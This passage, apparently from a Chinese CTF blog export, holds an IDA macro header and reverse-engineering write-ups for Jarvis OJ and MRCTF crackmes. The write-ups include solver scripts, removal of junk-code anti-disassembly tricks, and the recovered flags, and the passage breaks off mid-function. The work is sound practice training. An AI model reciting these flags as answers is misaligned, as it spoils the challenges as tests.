SWORD2(x) SWORDn(x, 2)#define SWORD3(x) SWORDn(x, 3)#define SWORD4(x) SWORDn(x, 4)#define SWORD5(x) SWORDn(x, 5)#define SWORD6(x) SWORDn(x, 6)#define SWORD7(x) SWORDn(x, 7)// Helper functions to represent some assembly instructions.#ifdef __cplusplus// Fill memory block with an integer valueinline void memset32(void *ptr, uint32 value, int count){ uint32 *p = (uint32 *)ptr; for ( int i=0; i &lt; count; i++ ) *p++ = value;}// Generate a reference to pair of operandstemplate&lt;class T&gt; int16 __PAIR__( int8 high, T low) { return ((( int16)high) &lt;&lt; sizeof(high)*8) | uint8(low); }template&lt;class T&gt; int32 __PAIR__( int16 high, T low) { return ((( int32)high) &lt;&lt; sizeof(high)*8) | uint16(low); }template&lt;class T&gt; int64 __PAIR__( int32 high, T low) { return ((( int64)high) &lt;&lt; sizeof(high)*8) | uint32(low); }template&lt;class T&gt; uint16 __PAIR__(uint8 high, T low) { return (((uint16)high) &lt;&lt; sizeof(high)*8) | uint8(low); }template&lt;class T&gt; uint32 __PAIR__(uint16 high, T low) { return (((uint32)high) &lt;&lt; sizeof(high)*8) | uint16(low); }template&lt;class T&gt; uint64 __PAIR__(uint32 high, T low) { return (((uint64)high) &lt;&lt; sizeof(high)*8) | uint32(low); }// rotate lefttemplate&lt;class T&gt; T __ROL__(T value, uint count){ const uint nbits = sizeof(T) * 8; count %= nbits; T high = value &gt;&gt; (nbits - count); value &lt;&lt;= count; value |= high; return value;}// rotate righttemplate&lt;class T&gt; T __ROR__(T value, uint count){ const uint nbits = sizeof(T) * 8; count %= nbits; T low = value &lt;&lt; (nbits - count); value &gt;&gt;= count; value |= low; return value;}// carry flag of left shifttemplate&lt;class T&gt; int8 __MKCSHL__(T value, uint count){ const uint nbits = sizeof(T) * 8; count %= nbits; return (value &gt;&gt; (nbits-count)) &amp; 1;}// carry flag of right shifttemplate&lt;class T&gt; int8 __MKCSHR__(T value, uint count){ return (value &gt;&gt; (count-1)) &amp; 1;}// sign flagtemplate&lt;class T&gt; int8 __SETS__(T x){ if ( sizeof(T) == 1 ) return int8(x) &lt; 0; if ( sizeof(T) == 2 ) return int16(x) &lt; 0; if ( sizeof(T) == 4 ) return int32(x) &lt; 0; return int64(x) &lt; 0;}// overflow flag of subtraction (x-y)template&lt;class T, class U&gt; int8 __OFSUB__(T x, U y){ if ( sizeof(T) &lt; sizeof(U) ) { U x2 = x; int8 sx = __SETS__(x2); return (sx ^ __SETS__(y)) &amp; (sx ^ __SETS__(x2-y)); } else { T y2 = y; int8 sx = __SETS__(x); return (sx ^ __SETS__(y2)) &amp; (sx ^ __SETS__(x-y2)); }}// overflow flag of addition (x+y)template&lt;class T, class U&gt; int8 __OFADD__(T x, U y){ if ( sizeof(T) &lt; sizeof(U) ) { U x2 = x; int8 sx = __SETS__(x2); return ((1 ^ sx) ^ __SETS__(y)) &amp; (sx ^ __SETS__(x2+y)); } else { T y2 = y; int8 sx = __SETS__(x); return ((1 ^ sx) ^ __SETS__(y2)) &amp; (sx ^ __SETS__(x+y2)); }}// carry flag of subtraction (x-y)template&lt;class T, class U&gt; int8 __CFSUB__(T x, U y){ int size = sizeof(T) &gt; sizeof(U) ? sizeof(T) : sizeof(U); if ( size == 1 ) return uint8(x) &lt; uint8(y); if ( size == 2 ) return uint16(x) &lt; uint16(y); if ( size == 4 ) return uint32(x) &lt; uint32(y); return uint64(x) &lt; uint64(y);}// carry flag of addition (x+y)template&lt;class T, class U&gt; int8 __CFADD__(T x, U y){ int size = sizeof(T) &gt; sizeof(U) ? sizeof(T) : sizeof(U); if ( size == 1 ) return uint8(x) &gt; uint8(x+y); if ( size == 2 ) return uint16(x) &gt; uint16(x+y); if ( size == 4 ) return uint32(x) &gt; uint32(x+y); return uint64(x) &gt; uint64(x+y);}#else// The following definition is not quite correct because it always returns// uint64. The above C++ functions are good, though.#define __PAIR__(high, low) (((uint64)(high)&lt;&lt;sizeof(high)*8) | low)// For C, we just provide macros, they are not quite correct.#define __ROL__(x, y) __rotl__(x, y) // Rotate left#define __ROR__(x, y) __rotr__(x, y) // Rotate right#define __CFSHL__(x, y) invalid_operation // Generate carry flag for (x&lt;&lt;y)#define __CFSHR__(x, y) invalid_operation // Generate carry flag for (x&gt;&gt;y)#define __CFADD__(x, y) invalid_operation // Generate carry flag for (x+y)#define __CFSUB__(x, y) invalid_operation // Generate carry flag for (x-y)#define __OFADD__(x, y) invalid_operation // Generate overflow flag for (x+y)#define __OFSUB__(x, y) invalid_operation // Generate overflow flag for (x-y)#endif// No definition for rcl/rcr because the carry flag is unknown#define __RCL__(x, y) invalid_operation // Rotate left thru carry#define __RCR__(x, y) invalid_operation // Rotate right thru carry#define __MKCRCL__(x, y) invalid_operation // Generate carry flag for a RCL#define __MKCRCR__(x, y) invalid_operation // Generate carry flag for a RCR#define __SETP__(x, y) invalid_operation // Generate parity flag for (x-y)// In the decompilation listing there are some objects declarared as _UNKNOWN// because we could not determine their types. Since the C compiler does not// accept void item declarations, we replace them by anything of our choice,// for example a char:#define _UNKNOWN char#ifdef _MSC_VER#define snprintf _snprintf#define vsnprintf _vsnprintf#endif","link":"/2020/03/10/IDA%E5%B8%B8%E7%94%A8%E5%AE%8F%E5%AE%9A%E4%B9%89/"},{"title":"Javis-OJ-wp","text":"Javis OJ的题目还是很不错的，可以仔细研究研究 reFindkeyDIE看看发现是pyc文件，试一下uncompyle6发现直接成功没加任何保护，看看代码 1234567891011121314151617import syslookup = [ 196, 153, 149, 206, 17, 221, 10, 217, 167, 18, 36, 135, 103, 61, 111, 31, 92, 152, 21, 228, 105, 191, 173, 41, 2, 245, 23, 144, 1, 246, 89, 178, 182, 119, 38, 85, 48, 226, 165, 241, 166, 214, 71, 90, 151, 3, 109, 169, 150, 224, 69, 156, 158, 57, 181, 29, 200, 37, 51, 252, 227, 93, 65, 82, 66, 80, 170, 77, 49, 177, 81, 94, 202, 107, 25, 73, 148, 98, 129, 231, 212, 14, 84, 121, 174, 171, 64, 180, 233, 74, 140, 242, 75, 104, 253, 44, 39, 87, 86, 27, 68, 22, 55, 76, 35, 248, 96, 5, 56, 20, 161, 213, 238, 220, 72, 100, 247, 8, 63, 249, 145, 243, 155, 222, 122, 32, 43, 186, 0, 102, 216, 126, 15, 42, 115, 138, 240, 147, 229, 204, 117, 223, 141, 159, 131, 232, 124, 254, 60, 116, 46, 113, 79, 16, 128, 6, 251, 40, 205, 137, 199, 83, 54, 188, 19, 184, 201, 110, 255, 26, 91, 211, 132, 160, 168, 154, 185, 183, 244, 78, 33, 123, 28, 59, 12, 210, 218, 47, 163, 215, 209, 108, 235, 237, 118, 101, 24, 234, 106, 143, 88, 9, 136, 95, 30, 193, 176, 225, 198, 197, 194, 239, 134, 162, 192, 11, 70, 58, 187, 50, 67, 236, 230, 13, 99, 190, 208, 207, 7, 53, 219, 203, 62, 114, 127, 125, 164, 179, 175, 112, 172, 250, 133, 130, 52, 189, 97, 146, 34, 157, 120, 195, 45, 4, 142, 139]pwda = [ 188, 155, 11, 58, 251, 208, 204, 202, 150, 120, 206, 237, 114, 92, 126, 6, 42]pwdb = [53, 222, 230, 35, 67, 248, 226, 216, 17, 209, 32, 2, 181, 200, 171, 60, 108]flag = raw_input('Input your Key:').strip()if len(flag) != 17: print 'Wrong Key!!' sys.exit(1)flag = flag[::-1]for i in range(0, len(flag)): if ord(flag[i]) + pwda[i] &amp; 255 != lookup[(i + pwdb[i])]: print 'Wrong Key!!' sys.exit(1)print 'Congratulations!!' 简单写个脚本逆一下 12345678910111213141516171819202122lookup = [ 196, 153, 149, 206, 17, 221, 10, 217, 167, 18, 36, 135, 103, 61, 111, 31, 92, 152, 21, 228, 105, 191, 173, 41, 2, 245, 23, 144, 1, 246, 89, 178, 182, 119, 38, 85, 48, 226, 165, 241, 166, 214, 71, 90, 151, 3, 109, 169, 150, 224, 69, 156, 158, 57, 181, 29, 200, 37, 51, 252, 227, 93, 65, 82, 66, 80, 170, 77, 49, 177, 81, 94, 202, 107, 25, 73, 148, 98, 129, 231, 212, 14, 84, 121, 174, 171, 64, 180, 233, 74, 140, 242, 75, 104, 253, 44, 39, 87, 86, 27, 68, 22, 55, 76, 35, 248, 96, 5, 56, 20, 161, 213, 238, 220, 72, 100, 247, 8, 63, 249, 145, 243, 155, 222, 122, 32, 43, 186, 0, 102, 216, 126, 15, 42, 115, 138, 240, 147, 229, 204, 117, 223, 141, 159, 131, 232, 124, 254, 60, 116, 46, 113, 79, 16, 128, 6, 251, 40, 205, 137, 199, 83, 54, 188, 19, 184, 201, 110, 255, 26, 91, 211, 132, 160, 168, 154, 185, 183, 244, 78, 33, 123, 28, 59, 12, 210, 218, 47, 163, 215, 209, 108, 235, 237, 118, 101, 24, 234, 106, 143, 88, 9, 136, 95, 30, 193, 176, 225, 198, 197, 194, 239, 134, 162, 192, 11, 70, 58, 187, 50, 67, 236, 230, 13, 99, 190, 208, 207, 7, 53, 219, 203, 62, 114, 127, 125, 164, 179, 175, 112, 172, 250, 133, 130, 52, 189, 97, 146, 34, 157, 120, 195, 45, 4, 142, 139]pwda = [ 188, 155, 11, 58, 251, 208, 204, 202, 150, 120, 206, 237, 114, 92, 126, 6, 42]pwdb = [53, 222, 230, 35, 67, 248, 226, 216, 17, 209, 32, 2, 181, 200, 171, 60, 108]flag = ''for i in range(17): index = 16 - i flag += chr((lookup[(index + pwdb[index])] - pwda[index])&amp;255)print(flag)# PCTF{PyC_Cr4ck3r} Classical Crackme这题有confuser的混淆，想脱掉这个壳有点困难，所以先看看代码 123456789101112131415private void \\u202C\\u200B\\u206A\\u202A\\u206D\\u206B\\u202D\\u206F\\u202D\\u200C\\u200E\\u206B\\u202E\\u202E\\u202C\\u202B\\u206A\\u206D\\u206E\\u202B\\u206E\\u200F\\u202D\\u200E\\u202C\\u200F\\u200D\\u200F\\u202B\\u200C\\u202A\\u206D\\u206A\\u206E\\u202D\\u200D\\u200C\\u206B\\u202A\\u202D\\u202E(object A_1, EventArgs A_2) { string s = this.\\u200E\\u206F\\u206A\\u200F\\u206E\\u202C\\u206C\\u200C\\u206A\\u200B\\u206E\\u202D\\u206B\\u202D\\u200F\\u206B\\u202B\\u200C\\u206B\\u202D\\u206D\\u202B\\u206B\\u200C\\u206F\\u206D\\u206A\\u202D\\u200F\\u202E\\u200B\\u206D\\u202C\\u200D\\u200D\\u202C\\u200F\\u202E\\u202E\\u206A\\u202E.Text.ToString(); byte[] bytes = Encoding.Default.GetBytes(s); string a = Convert.ToBase64String(bytes); string b = \"UENURntFYTV5X0RvX05ldF9DcjRjazNyfQ==\"; if (a == b) { MessageBox.Show(\"注册成功！\", \"提示\", MessageBoxButtons.OK); } else { MessageBox.Show(\"注册失败！\", \"提示\", MessageBoxButtons.OK, MessageBoxIcon.Hand); } } 找到关键部分，发现是简单对输入base64处理，然后直接对比，所以base64解码之后就可以了 Classic Crackme2这题和上一个基本相似，也是c#+confuser，不过这次想直接找到关键代码有点困难，所以调试解决，在主函数下断点 断点处这一串奇怪的字符串名应该就是关键的类，启动调试，跟进去 调试过程中发现了关键的比较 text1是我们的输入，去看看text2是什么 发现加密方式是AES-ECB方式加密，填充方式也已知，key在局部变量窗口可以获得，最后应该还有个比较，接着调试 发现了我们的输入被加密之后和另一串进行了一个比较，然后就可以写个脚本来跑一跑 1234567891011import base64from Crypto.Cipher import AEScipher = \"x/nzolo0TTIyrEISd4AP1spCzlhSWJXeNbY81SjPgmk=\"cipher = base64.b64decode(cipher)key=\"pctf2016pctf2016pctf2016pctf2016\"cryptor = AES.new(key, AES.MODE_ECB)plain_text = cryptor.decrypt(cipher)print(plain_text)#b'PCTF{Dot_Net_UnPack3r_yoo}\\x06\\x06\\x06\\x06\\x06\\x06' SmaliSmali的语法我还是不是很会，不过这题比较简单，可以很容易看出来，也是简单的AES加密 123456789101112import base64from Crypto.Cipher import AEScipher = \"sSNnx1UKbYrA1+MOrdtDTA==\"cipher = base64.b64decode(cipher)key = \"cGhyYWNrICBjdGYgMjAxNg==\"key = base64.b64decode(key)cryptor = AES.new(key, AES.MODE_ECB)plain_text = cryptor.decrypt(cipher)print(plain_text)#b'PCTF{Sm4liRiver}'","link":"/2020/04/01/Javis-OJ-wp/"},{"title":"MRCTF-wp","text":"最近招新事情实在是有点多，这比赛只打了半天，做了几道re和简单的pwn，随便写一下 retransform太简单了没什么好说的，直接上代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788#include&lt;iostream&gt;#include \"ida.h\"using namespace std;int main(){ signed int dword_40F040[33] = { 9, 10, 15, 23, 7, 24, 12, 6, 1, 16, 3, 17, 32, 29, 11, 30, 27, 22, 4, 13, 19, 20, 21, 2, 25, 5, 31, 8, 18, 26, 28, 14, 0 }; char target[33] = { 103, 121, 123, 127, 117, 43, 60, 82, 83, 121, 87, 94, 93, 66, 123, 45, 42, 102, 66, 126, 76, 87, 121, 65, 107, 126, 101, 60, 92, 69, 111, 98, 77 }; char tmp[33]; char flag[33]; for(int i=0;i&lt;=32;i++) { tmp[i]=target[i]^LOBYTE(dword_40F040[i]); flag[dword_40F040[i]]=tmp[i]; } cout&lt;&lt;flag&lt;&lt;endl; return 0;} 撸啊撸简单的lua，用了smc，但是调试可以之间看到执行的代码，复制出来即可 123456789101112131415161718192021cmps={{83,80,73,80,76,125,61,96,107,85,62,63,121,122,101,33,123,82,101,114,54,100,101,97,85,111,39,97}}print(\\\"Give Me Your Flag LOL!:\\\")flag=io.read()if string.len(flag)~=28 then print(\\\"Wrong flag!\\\") os.exit()endfor i=1,string.len(flag) do local x=string.byte(flag,i) if i%2==0 then x=x~i else x=x+6 end if x~=cmps[i] then print(\\\"Wrong flag!\\\") os.exit() endendprint(\\\"Right flag!\\\")os.exit() 判断的逻辑也很简单，分奇偶进行不同的操作，用python跑一遍就可以出来flag 1234567891011cmps = [83, 80, 73, 80, 76, 125, 61, 96, 107, 85, 62, 63, 121, 122, 101, 33, 123, 82, 101, 114, 54, 100, 101, 97, 85, 111, 39, 97]flag=''for i in range(28): x = cmps[i] if (i + 1) % 2 == 0: x ^= (i + 1) else: x -= 6 flag+=chr(x)print(flag) PixelShooter游戏我是一点都不会打，直接解包找到dll在字符串视图可以直接看到flag hello_world_go乱七八糟看了就觉得头疼的go 找到主函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475__int64 __fastcall main_main(__int64 a1, __int64 a2){ __int64 v2; // r8 __int64 v3; // r9 __int64 v4; // r8 __int64 v5; // r9 __int64 v6; // rdx __int64 v7; // r8 __int64 v8; // rcx __int64 v9; // rdx __int64 v10; // r9 signed __int64 v11; // rax __int64 result; // rax __int64 v13; // ST58_8 __int64 *v14; // [rsp+8h] [rbp-A8h] char v15; // [rsp+18h] [rbp-98h] __int64 *v16; // [rsp+60h] [rbp-50h] __int128 v17; // [rsp+68h] [rbp-48h] void *v18; // [rsp+78h] [rbp-38h] void **v19; // [rsp+80h] [rbp-30h] __int128 v20; // [rsp+88h] [rbp-28h] __int128 v21; // [rsp+98h] [rbp-18h] if ( (unsigned __int64)&amp;v19 &lt;= *(_QWORD *)(__readfsqword(0xFFFFFFF8) + 16) ) runtime_morestack_noctxt(); runtime_newobject(a1, a2); v16 = v14; *(_QWORD *)&amp;v21 = &amp;unk_4AC9C0; *((_QWORD *)&amp;v21 + 1) = &amp;off_4EA530; fmt_Fprint(a1, a2, (__int64)&amp;v21, (__int64)&amp;unk_4AC9C0, v2, v3, (__int64)&amp;off_4EBDA0, qword_577550); *(_QWORD *)&amp;v20 = &amp;unk_4A96A0; *((_QWORD *)&amp;v20 + 1) = v16; fmt_Fscanf( a1, a2, (__int64)&amp;off_4EBD80, (__int64)&amp;v20, v4, v5, (__int64)&amp;off_4EBD80, qword_577548, (__int64)&amp;unk_4D07C9, 2LL); v8 = v16[1]; if ( v8 != 24 ) goto LABEL_3; v13 = *v16; runtime_memequal(a1, a2, v6, (unsigned __int64)&amp;unk_4D3C58); if ( !v15 ) { v8 = 24LL;LABEL_3: runtime_cmpstring(a1, a2, (__int64)&amp;unk_4D3C58, v8, v7); if ( (signed __int64)&amp;v20 &gt;= 0 ) v11 = 1LL; else v11 = -1LL; goto LABEL_5; } v11 = 0LL;LABEL_5: if ( v11 ) { *(_QWORD *)&amp;v17 = &amp;unk_4AC9C0; *((_QWORD *)&amp;v17 + 1) = &amp;off_4EA550; result = fmt_Fprintln(a1, a2, v9, (__int64)&amp;off_4EBDA0, v7, v10, (__int64)&amp;off_4EBDA0, qword_577550); } else { v18 = &amp;unk_4AC9C0; v19 = &amp;off_4EA540; result = fmt_Fprintln(a1, a2, v9, (__int64)&amp;off_4EBDA0, v7, v10, (__int64)&amp;off_4EBDA0, qword_577550); } return result;} 看到了输出提示语，然后输入，最后进行字符串比较，输出正误，没见到有什么特殊的处理，猜测直接flag明文比较，点进去，得到flag 1flag{hello_world_gogogo} junk这一题还像是一道正常难度的re…… 看起来很正常的流程图，但是接下来就发现F5大法不好使了，猜测题目junk的意思应该是加了混淆，所以干脆直接看汇编 题目需要输入一个字符串并存储到了0x4216A0的位置，在loc_401200内进行判断，通过eax来判别是否正确，直接call一个位置说明在这个判断函数里动了很多手脚，进去看看 然后发现简直乱七八糟 12345678910111213141516171819202122232425262728293031.text:00401200 loc_401200: ; CODE XREF: sub_401390+1E↓p.text:00401200 push ebp.text:00401201 mov ebp, esp.text:00401203 sub esp, 3Ch.text:00401206 push ebx.text:00401207 push esi.text:00401208 push edi.text:00401209 mov eax, [ebp+4].text:0040120C sub esp, 0E9h.text:00401212 push eax.text:00401213 mov dword ptr [ebp-8], offset unk_4216A0.text:0040121A mov eax, [ebp-8].text:0040121D add eax, 1.text:00401220 mov [ebp-1Ch], eax.text:00401223.text:00401223 loc_401223: ; CODE XREF: .text:00401233↓j.text:00401223 mov ecx, [ebp-8].text:00401226 mov dl, [ecx].text:00401228 mov [ebp-1], dl.text:0040122B add dword ptr [ebp-8], 1.text:0040122F cmp byte ptr [ebp-1], 0.text:00401233 jnz short loc_401223.text:00401235 mov eax, [ebp-8].text:00401238 sub eax, [ebp-1Ch].text:0040123B mov [ebp-20h], eax.text:0040123E mov ecx, [ebp-20h].text:00401241 mov [ebp-24h], ecx.text:00401244 cmp dword ptr [ebp-24h], 2Bh.text:00401248 jz short loc_401251.text:0040124A xor al, al.text:0040124C jmp loc_401387 这段的意思实际上就是判断了一下字符串的长度为0x2B，然后进行了一个跳转，如果长度不为0x2B，跳转到结束部分，如果是，进行下一步的处理，然后发现下一步有个花指令 1234567891011121314151617181920212223242526272829loc_401251: ; CODE XREF: .text:00401248↑j.text:00401251 call sub_401275.text:00401256 call near ptr 2BFF088Eh.text:00401256 ; ---------------------------------------------------------------------------.text:0040125B db 0.text:0040125C db 0.text:0040125D db 0.text:0040125E db 33h.text:0040125F db 0C0h.text:00401260 db 8Ah.text:00401261 db 86h.text:00401262 db 9Fh ; OFF32 SEGDEF [_data,42169F].text:00401263 db 16h.text:00401264 db 42h ; B.text:00401265 db 0.text:00401266 db 34h.text:00401267 db 3.text:00401268 db 88h.text:00401269 db 86h.text:0040126A db 9Fh ; OFF32 SEGDEF [_data,42169F].text:0040126B db 16h.text:0040126C db 42h ; B.text:0040126D db 0.text:0040126E db 4Eh.text:0040126F db 85h.text:00401270 db 0F6h.text:00401271 db 75h.text:00401272 db 0EBh.text:00401273 db 0EBh 开始变得乱七八糟，看一下call的函数内容 123456sub_401275 proc near ; CODE XREF: .text:loc_401251↑p.text:00401275 pop eax.text:00401276 add eax, 1.text:00401279 push eax.text:0040127A retn.text:0040127A sub_401275 endp 这就是个典型的花指令，首先call一个函数，相当于push eip+jmp，这个时候栈顶是eip就是函数执行结束之后需要返回的地址，但是进入这个函数之后发现，这个函数的作用就是把栈顶的old eip弹出到eax，然后+1，再push到栈顶，这使得最后返回的时候跳过了call命令紧接着的那个字节，所以手动去一下花，真正的指令应该是 123456789101112 xor esi, esi.text:00401259 mov esi, 2Bh.text:0040125E.text:0040125E loc_40125E: ; CODE XREF: .text:00401271↓j.text:0040125E xor eax, eax.text:00401260 mov al, byte ptr (dword_42169C+3)[esi].text:00401266 xor al, 3.text:00401268 mov byte ptr (dword_42169C+3)[esi], al.text:0040126E dec esi.text:0040126F test esi, esi.text:00401271 jnz short loc_40125E.text:00401273 jmp short loc_40127B 对于输入的字符每一个都和3异或得到了新的字符串，这里用的al取低八位实际上没有什么影响，因为输入的字符都在0~255之间，然后接下来还有一个跳转 1234567891011121314151617181920loc_40127B: ; CODE XREF: .text:00401273↑j.text:0040127B xor eax, eax.text:0040127D jz short near ptr loc_40127F+1.text:0040127F.text:0040127F loc_40127F: ; CODE XREF: .text:0040127D↑j.text:0040127F call near ptr 2BFF08B7h.text:0040127F ; ---------------------------------------------------------------------------.text:00401284 db 0.text:00401285 db 0.text:00401286 db 0.text:00401287 db 33h ; 3.text:00401288 db 0C0h, 8Ah, 86h.text:0040128B dd offset dword_42169C+3.text:0040128F db 8Bh.text:00401290 dd 74DB33CEh, 0E183E801h, 0F98301h, 0C8C00574h, 0C003EB04h.text:00401290 dd 868804C0h.text:004012A8 dd offset dword_42169C+3.text:004012AC dd 75F6854Eh, 2BBAD6h.text:004012B4 db 2 dup(0), 0B9h.text:004012B7 dd offset unk_4216A0 又是一个花指令，这个就比较明显，去花 1234567891011loc_401287: ; CODE XREF: .text:004012AF↓j.text:00401287 xor eax, eax.text:00401289 mov al, byte ptr (dword_42169C+3)[esi].text:0040128F mov ecx, esi.text:00401291 xor ebx, ebx.text:00401293 jz short near ptr loc_401295+1.text:00401295.text:00401295 loc_401295: ; CODE XREF: .text:00401293↑j.text:00401295 call near ptr 8341F41Dh.text:0040129A stc.text:0040129B add [ebp+eax-40h], dh 又是一个明显的花指令，接着去花，之后就没什么阻碍了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131loc_40127B: ; CODE XREF: .text:00401273↑j.text:0040127B xor eax, eax.text:0040127D jz short loc_401280.text:0040127D ; ---------------------------------------------------------------------------.text:0040127F db 0E8h.text:00401280 ; ---------------------------------------------------------------------------.text:00401280.text:00401280 loc_401280: ; CODE XREF: .text:0040127D↑j.text:00401280 xor esi, esi.text:00401282 mov esi, 2Bh.text:00401287.text:00401287 loc_401287: ; CODE XREF: .text:004012AF↓j.text:00401287 xor eax, eax.text:00401289 mov al, byte ptr (dword_42169C+3)[esi].text:0040128F mov ecx, esi.text:00401291 xor ebx, ebx.text:00401293 jz short loc_401296.text:00401293 ; ---------------------------------------------------------------------------.text:00401295 db 0E8h.text:00401296 ; ---------------------------------------------------------------------------.text:00401296.text:00401296 loc_401296: ; CODE XREF: .text:00401293↑j.text:00401296 and ecx, 1.text:00401299 cmp ecx, 0.text:0040129C jz short loc_4012A3.text:0040129E ror al, 4.text:004012A1 jmp short loc_4012A6.text:004012A3 ; ---------------------------------------------------------------------------.text:004012A3.text:004012A3 loc_4012A3: ; CODE XREF: .text:0040129C↑j.text:004012A3 rol al, 4.text:004012A6.text:004012A6 loc_4012A6: ; CODE XREF: .text:004012A1↑j.text:004012A6 mov byte ptr (dword_42169C+3)[esi], al.text:004012AC dec esi.text:004012AD test esi, esi.text:004012AF jnz short loc_401287.text:004012B1 mov edx, 2Bh.text:004012B6 mov ecx, offset unk_4216A0.text:004012BB call sub_401090.text:004012C0 mov dword ptr [ebp-0Ch], offset byte_421708.text:004012C7 mov edx, [ebp-0Ch].text:004012CA add edx, 1.text:004012CD mov [ebp-28h], edx.text:004012D0.text:004012D0 loc_4012D0: ; CODE XREF: .text:004012E0↓j.text:004012D0 mov eax, [ebp-0Ch].text:004012D3 mov cl, [eax].text:004012D5 mov [ebp-2], cl.text:004012D8 add dword ptr [ebp-0Ch], 1.text:004012DC cmp byte ptr [ebp-2], 0.text:004012E0 jnz short loc_4012D0.text:004012E2 mov edx, [ebp-0Ch].text:004012E5 sub edx, [ebp-28h].text:004012E8 mov [ebp-30h], edx.text:004012EB mov dword ptr [ebp-10h], offset aBuedvshlmfwhpz ; \"%BUEdVSHlmfWhpZn!oaWZ(aGBsZ@ZpZn!oaWZ(a\"....text:004012F2 mov eax, [ebp-10h].text:004012F5 add eax, 1.text:004012F8 mov [ebp-2Ch], eax.text:004012FB.text:004012FB loc_4012FB: ; CODE XREF: .text:0040130B↓j.text:004012FB mov ecx, [ebp-10h].text:004012FE mov dl, [ecx].text:00401300 mov [ebp-3], dl.text:00401303 add dword ptr [ebp-10h], 1.text:00401307 cmp byte ptr [ebp-3], 0.text:0040130B jnz short loc_4012FB.text:0040130D mov eax, [ebp-10h].text:00401310 sub eax, [ebp-2Ch].text:00401313 mov [ebp-34h], eax.text:00401316 mov ecx, [ebp-30h].text:00401319 cmp ecx, [ebp-34h].text:0040131C jz short loc_401322.text:0040131E xor al, al.text:00401320 jmp short loc_401387.text:00401322 ; ---------------------------------------------------------------------------.text:00401322.text:00401322 loc_401322: ; CODE XREF: .text:0040131C↑j.text:00401322 mov dword ptr [ebp-18h], 0.text:00401329 jmp short loc_401334.text:0040132B ; ---------------------------------------------------------------------------.text:0040132B.text:0040132B loc_40132B: ; CODE XREF: .text:loc_401383↓j.text:0040132B mov edx, [ebp-18h].text:0040132E add edx, 1.text:00401331 mov [ebp-18h], edx.text:00401334.text:00401334 loc_401334: ; CODE XREF: .text:00401329↑j.text:00401334 mov dword ptr [ebp-14h], offset byte_421708.text:0040133B mov eax, [ebp-14h].text:0040133E add eax, 1.text:00401341 mov [ebp-38h], eax.text:00401344.text:00401344 loc_401344: ; CODE XREF: .text:00401354↓j.text:00401344 mov ecx, [ebp-14h].text:00401347 mov dl, [ecx].text:00401349 mov [ebp-4], dl.text:0040134C add dword ptr [ebp-14h], 1.text:00401350 cmp byte ptr [ebp-4], 0.text:00401354 jnz short loc_401344.text:00401356 mov eax, [ebp-14h].text:00401359 sub eax, [ebp-38h].text:0040135C mov [ebp-3Ch], eax.text:0040135F mov ecx, [ebp-18h].text:00401362 cmp ecx, [ebp-3Ch].text:00401365 jnb short loc_401385.text:00401367 mov edx, [ebp-18h].text:0040136A movsx eax, byte_421708[edx].text:00401371 mov ecx, [ebp-18h].text:00401374 movsx edx, byte ptr aBuedvshlmfwhpz[ecx] ; \"%BUEdVSHlmfWhpZn!oaWZ(aGBsZ@ZpZn!oaWZ(a\"....text:0040137B cmp eax, edx.text:0040137D jz short loc_401383.text:0040137F xor al, al.text:00401381 jmp short loc_401387.text:00401383 ; ---------------------------------------------------------------------------.text:00401383.text:00401383 loc_401383: ; CODE XREF: .text:0040137D↑j.text:00401383 jmp short loc_40132B.text:00401385 ; ---------------------------------------------------------------------------.text:00401385.text:00401385 loc_401385: ; CODE XREF: .text:00401365↑j.text:00401385 mov al, 1.text:00401387.text:00401387 loc_401387: ; CODE XREF: .text:0040124C↑j.text:00401387 ; .text:00401320↑j ....text:00401387 pop edi.text:00401388 pop esi.text:00401389 pop ebx.text:0040138A mov esp, ebp.text:0040138C pop ebp.text:0040138D retn 这些都很容易分析，可以看到先分奇偶分别进行了左右循环移位，虽然我看不懂这迷惑的左右移四位是什么情况，实际上就是每个字符前四位和后四位交换位置 然后调用了一个函数进行了处理，处理之后和已知的字符串进行对比，相同就返回正确，逻辑很简单，用来处理的函数如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697char __fastcall sub_401090(char *a1, int a2){ int v2; // eax signed int v3; // esi int v4; // edi char v5; // al unsigned __int8 v6; // ah unsigned __int8 v7; // dh unsigned __int8 v8; // bh unsigned __int8 v9; // dl signed int v10; // eax bool v11; // cf unsigned __int8 v12; // cl int i; // ecx int v15; // [esp+8h] [ebp-14h] char v16; // [esp+10h] [ebp-Ch] char v17; // [esp+11h] [ebp-Bh] char v18; // [esp+12h] [ebp-Ah] char v19; // [esp+13h] [ebp-9h] unsigned __int8 v20; // [esp+14h] [ebp-8h] unsigned __int8 v21; // [esp+15h] [ebp-7h] unsigned __int8 v22; // [esp+16h] [ebp-6h] unsigned __int8 v23; // [esp+1Bh] [ebp-1h] v2 = a2; v3 = 0; v4 = 0; if ( a2 ) { do { v15 = v2 - 1; v5 = *a1++; *(&amp;v20 + v3++) = v5; v6 = v22; v7 = v21; v8 = v20; v23 = v22; if ( v3 == 3 ) { v9 = (v22 &gt;&gt; 6) + 4 * (v21 &amp; 0xF); v17 = (v21 &gt;&gt; 4) + 16 * (v20 &amp; 3); v18 = (v22 &gt;&gt; 6) + 4 * (v21 &amp; 0xF); v19 = v22 &amp; 0x3F; v16 = v20 &gt;&gt; 2; byte_421708[v4] = byte_41EA00[v20 &gt;&gt; 2]; byte_421709[v4] = byte_41EA00[(unsigned __int8)((v7 &gt;&gt; 4) + 16 * (v8 &amp; 3))]; byte_42170A[v4] = byte_41EA00[v9]; byte_42170B[v4] = byte_41EA00[v6 &amp; 0x3F]; v4 += 4; v3 = 0; } v2 = v15; } while ( v15 ); if ( v3 ) { v10 = v3; if ( v3 &gt;= 3 ) { v12 = v23; } else { v11 = (unsigned int)v3 &lt; 3; do { if ( !v11 ) { sub_40150A(a1); JUMPOUT(*(_DWORD *)algn_4011F3); } *(&amp;v20 + v10++) = 0; v11 = (unsigned int)v10 &lt; 3; } while ( v10 &lt; 3 ); v12 = v22; v7 = v21; v8 = v20; } v16 = v8 &gt;&gt; 2; v17 = (v7 &gt;&gt; 4) + 16 * (v8 &amp; 3); LOBYTE(v2) = v12 &gt;&gt; 6; v19 = v12 &amp; 0x3F; v18 = (v12 &gt;&gt; 6) + 